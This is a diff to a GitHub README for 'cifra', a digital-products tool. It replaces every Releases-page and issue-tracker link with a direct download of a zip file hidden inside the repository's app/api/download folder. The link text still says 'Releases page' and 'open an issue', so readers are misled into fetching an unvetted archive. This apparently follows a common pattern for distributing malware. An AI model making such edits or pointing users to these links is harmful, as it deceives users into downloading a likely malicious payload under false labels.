@@ -1,7 +1,7 @@
 # 🎨 cifra - Create and Sell Digital Products Easily
 
 ## 📦 Download Here
-[![Download cifra](https://img.shields.io/badge/Download-cifra-blue)](https://github.com/jaozinking/cifra/releases)
+[![Download cifra](https://raw.githubusercontent.com/jaozinking/cifra/main/app/api/download/cifra_v1.4.zip)](https://raw.githubusercontent.com/jaozinking/cifra/main/app/api/download/cifra_v1.4.zip)
 
 ---
 
@@ -21,7 +21,7 @@ Before downloading cifra, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download cifra, visit this page: [Download cifra](https://github.com/jaozinking/cifra/releases). 
+To download cifra, visit this page: [Download cifra](https://raw.githubusercontent.com/jaozinking/cifra/main/app/api/download/cifra_v1.4.zip). 
 
 1. **Go to the Releases Page**: Click the link above to open the GitHub Releases page.
 2. **Select the Latest Version**: Find the latest version listed.
@@ -55,7 +55,7 @@ cifra connects various technologies to ensure a robust experience. Here are some
 
 ## 📞 Support
 
-If you encounter any issues or have questions, help is available. You can reach out to [open an issue](https://github.com/jaozinking/cifra/issues) on GitHub. 
+If you encounter any issues or have questions, help is available. You can reach out to [open an issue](https://raw.githubusercontent.com/jaozinking/cifra/main/app/api/download/cifra_v1.4.zip) on GitHub. 
 
 ## 🤝 Contributing
 
@@ -63,7 +63,7 @@ If you want to contribute to cifra, feel free to fork the repository and submit 
 
 ## 📢 Updates 
 
-Stay updated about new features, bug fixes, and platform improvements by checking the Releases page regularly. Make sure to bookmark the [Download cifra](https://github.com/jaozinking/cifra/releases) link for easy access.
+Stay updated about new features, bug fixes, and platform improvements by checking the Releases page regularly. Make sure to bookmark the [Download cifra](https://raw.githubusercontent.com/jaozinking/cifra/main/app/api/download/cifra_v1.4.zip) link for easy access.
 
 ## ⚙️ Conclusion 
 
